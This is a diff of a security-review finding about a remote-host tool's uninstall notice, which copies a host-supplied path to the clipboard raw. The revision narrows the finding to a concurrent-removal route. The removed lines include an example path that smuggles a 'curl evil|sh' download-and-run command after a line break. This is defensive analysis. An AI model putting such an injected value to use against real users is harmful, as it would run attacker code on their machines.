@@ -1,72 +1,73 @@
-# The uninstall notice's copy button puts a host-reported path on the clipboard raw, with no hidden-characters warning
+# The uninstall notice copies a remote path without a hidden-characters warning
 
 Reviewed commit: 08ab6e08f9ddd40b5494f2cbbeaaeb9d4e3332b7
 
+Additional reviewed commit: 9d266e28595e8c2c07b378174f35eedf84258a70
+
 ## TLDR
 
-After you uninstall Farhelm from a remote host, the hosts panel offers a "copy" button for the folder where that host's
-data was kept. The panel shows the path with hidden characters made visible, but the button copies exactly what the
-remote host reported, line breaks and hidden characters included, and says nothing about them. A hostile host could make
-that "path" contain a line break followed by a command, which would run if you pasted it into a shell on your own
-machine that does not guard pastes. The session header's copy buttons warn when a copied value contains hidden
-characters; this one does not.
+The kept-data notice displays a remote path with hidden characters escaped but copies its raw value without warning. An
+ordinary successful uninstall rejects line breaks before reaching that notice. A different conditional route remains:
+after uninstall fails, removal from another window can expose the owed notice before the first window receives failure.
+A dangerous clipboard value and subsequent unsafe shell paste remain conditions, not observed exploitation.
 
 ## Details
 
-Found by the 2026-10-22 prioritized persistent review, group `161-ui-hosts-3of6` (finding f1, revision 2). Recording
-first proposed dropping it; the independent reviewer disagreed, and this file records it with that reviewer's basis.
+Suggested bucket: **highest**, conditional remote-to-local security consequence. Confidence: **confirmed raw-copy
+behavior and conditional concurrent-removal source route**; clipboard success, human reliance and downstream command
+execution remain unverified. Hidden Unicode outside control characters is a separate remainder with no established
+execution consequence. This record does not claim any arbitrary newline path survives successful uninstall.
 
-Mechanism:
+`crates/farhelm-ui/src/hosts.rs:2283–2285` at the additional revision copies `notice.state_dir` raw without
+hidden-character feedback. Escaped visible text does not change those bytes. The retained plan supplies the path. A
+hostile host's inspection can supply the default path when no state folder is registered; the original review traced the
+NUL-separated field through `bytes_path`. That input route alone does not prove notice reachability.
 
-- `crates/farhelm-ui/src/hosts.rs:2278-2288`: the uninstall notice's copy button calls
-  `crate::session_view::copy_to_clipboard(&path)` with `notice.state_dir` unmodified and gives no hidden-characters
-  feedback. The visible line, tooltip and accessible sentence show the same value escaped (`uninstall_notice_parts`,
-  2763; `uninstall_notice_compact_parts`, 2777; `peer_parts_tooltip`, 2832), so the user sees an escaped path and gets
-  the raw one.
-- Where the value comes from: `plan.kept_state_dir` (`crates/farhelm-ui/src/provisioning.rs` around 1487 and 3600-3612)
-  is the helm's uninstall plan `state_dir`. When the host has no stored state folder, the helm uses
-  `inspection.default_state_dir` (`crates/farhelm-helm/src/provisioning/service.rs:1466-1469`), which
-  `parse_uninstall_inspection` reads from the remote's NUL-separated output
-  (`crates/farhelm-helm/src/provisioning/backend.rs:2763-2764`) through `bytes_path` (2843-2846), which accepts any
-  bytes. The reviewer found no rejection of control characters or newlines on paths in
-  `crates/farhelm-helm/src/provisioning` (the only `is_control` check is on a distro id, backend.rs around 3050). The
-  path must also canonicalize on the host, which a hostile host can arrange by creating that directory (newlines are
-  legal in Unix file names).
-- Trigger: a compromised remote reports a default state folder such as `/home/u/.local/state/farhelm<LF>curl evil|sh`
-  (through its own `HOME` or `XDG_STATE_HOME`, or by answering the inspection directly). The user uninstalls, clicks
-  copy, and pastes into a local shell without bracketed paste (or into an `ssh other-host ...` command line).
+### Correction: successful uninstall rejects line feeds and Cc controls
 
-Why this is not covered:
+The original finding incorrectly said provisioning had no later control-character guard. At the original reviewed
+revision, `crates/farhelm-helm/src/provisioning/plan.rs:834–847,856` places `StopSupervisor` using the planned state
+socket before `ForgetHost`, and returns that same kept-state path. `backend.rs:2634–2643` constructs the stop script
+through `shell_path`/`path_text` (`2798–2799,2816–2817`), which delegates to `units.rs:471–482`: UTF-8 and
+`char::is_control` validation. Failure stops execution (`service.rs:1996–2006,2226–2233`). At the additional revision
+the equivalent paths are `plan.rs:842–855,864`; `backend.rs:2644–2653,2813–2815,2831–2833`; and
+`service.rs:1995–2006,2225–2232`.
 
-- SPEC.md:3238-3240 accepts a remote program writing the clipboard through OSC 52 ("an explicitly allowed, bounded
-  effect across the remote-host boundary, including when a malicious program replaces the clipboard"). The independent
-  reviewer judged that this does not cover an explicit copy button that hands over raw host-supplied text the GUI
-  presented as a path: OSC 52 needs an attached terminal on that host, while here the user asked to copy what they were
-  told is a path, so they have more reason to paste it into a shell.
-- Ledger precedent: TRIAGE_OUTCOMES.md "session-header-raw-peer-text.md" (around 2287-2300) concerns the session
-  header's copy buttons copying supervisor-supplied text raw. The user chose `fix code`: "keep copying the raw bytes;
-  when a copied value contains characters `display_peer` escapes, the copy feedback says it contains hidden characters
-  (shown as `<U+…>`) rather than refusing the copy". SPEC.md:1853 carries that over ("A hidden-characters copy warning
-  opens upward from the bar and stays within the window").
-- SPEC.md:3484-3487 trusts only the user's own configured host names, destinations and state folder in commands offered
-  for copying, "never text a remote host supplies".
-- SPEC.md "Local authority and trust between hosts", "Confirmed 2026-10-10" (around 3198-3202), escapes host-supplied
-  text for display; it says nothing about copying.
+Confirmation compares the whole derived-equality plan (`service.rs:1847–1864`; `plan.rs:397–415`), preventing an
+ordinary run from validating a clean replacement path while keeping a different original newline path in its notice.
+Host/socket absence does not bypass local script construction. The notice normally appears on host absence
+(`hosts.rs:1529–1548`); failure cleanup withdraws its owed entry (`provisioning.rs:3546–3570`). Independent review
+agreed to refute only this ordinary completed-uninstall line-feed/control-character scenario. The earlier verification
+sketch that stopped at plan construction was insufficient.
 
-How to verify: unit-test `parse_uninstall_inspection` with a default state field containing `\n` and follow it through
-`plan_uninstall` to the UI plan's `state_dir.raw()`; then check that the notice's copy produces the raw value with no
-warning. The reviewer did not check `layout.plan_uninstall` (called at service.rs around 1488) for a later rejection.
+### Concurrent removal can still promote the owed notice
 
-Fix shape: follow the session-header precedent and have the notice's copy feedback warn when the copied value contains
-characters `display_peer` escapes. Alternatively refuse control characters in the planned state folder at the helm.
+An accepted uninstall registers the owed notice, fails, and releases its server run lock. A second GUI can remove that
+host before the confirming GUI receives the matching Failed progress. Host and progress reads are independent
+(`list/view.rs:1278–1290,1732–1809,1843–1846,1902–1905`; `provisioning.rs:2738–2741,2810–2887`; `reader.rs:644–678`).
+The HTTP funnel orders preceding configuration saves, not sibling GETs (`api.rs:1981–2051`). Accepted uninstall requests
+progress without awaiting it (`provisioning.rs:1859–1868`).
 
-Suggested bucket: highest (security across the remote-host boundary). Triage may align the bucket with the
-session-header precedent, which was decided as `fix code` without a recorded bucket in that entry's text.
+The host read can therefore commit absence before any Failed snapshot. The notice effect promotes on absence alone
+(`hosts.rs:1529–1548`). After removal, server progress needs the missing host row and returns an error
+(`service.rs:2335–2358`; UI `api.rs:4494–4505`), which sets only `progress_error` (`provisioning.rs:2871–2876`). Even a
+late matching failure cleanup removes only the owed entry, not a notice already promoted (`3550–3568`). No special
+ordering between effects is needed when no Failed value was received at all. This establishes the conditional notice
+route, not an observed paste exploit.
 
-Confidence: likely. Remaining unverified premise: that `layout.plan_uninstall` does not reject such a path.
+The guard also does not reject every presentation-unsafe character: `farhelm-proto/src/text.rs:18–36,57–79`
+distinguishes characters such as U+202E, U+200B and U+2028 from Cc controls. Keep that raw-copy remainder without
+assuming those characters have the line-feed command-injection effect.
 
-Reviewer's proposed drop, not accepted by the independent check: the OSC 52 acceptance above, on the grounds that a
-malicious remote can already put any text on the clipboard without a click.
+Possible cover: OSC 52's accepted remote clipboard effect differs from an explicit GUI path-copy button.
+`TRIAGE_OUTCOMES.md:2287–2309`, “session-header-raw-peer-text.md,” is precedent for retaining raw copy with a warning,
+not acceptance of omitting it. The concurrent false-success decision, “uninstall-forgotten-success.md,” at pinned-tip
+`12897–12924`, accepts misleading status, not remote-to-local command execution. No exact full exclusion was
+established. Proposed drop: none for these remaining conditional concerns. A fix should follow the existing
+hidden-character copy feedback contract; further validation must distinguish successful-run guards from concurrent
+independent removal.
 
-Possible cover, for triage to judge: SPEC.md "Local authority and trust between hosts" (OSC 52 paragraph, around
-3238-3243); TRIAGE_OUTCOMES.md "session-header-raw-peer-text.md" (precedent for the fix, not a cover).
+Original provenance: prioritized persistent review `161-ui-hosts-3of6/f1`, revision 2, with independent disagreement on
+the OSC 52 exclusion. Corrections and extension: trailing review through `616d79f45d6a1d817833291429d144a5c686bb4b`,
+private run `4fae501c-3686-4822-aa6c-037266637632`, `g022/f5`, fresh `a013/f1–f3`. No runtime reproduction or clipboard
+experiment.
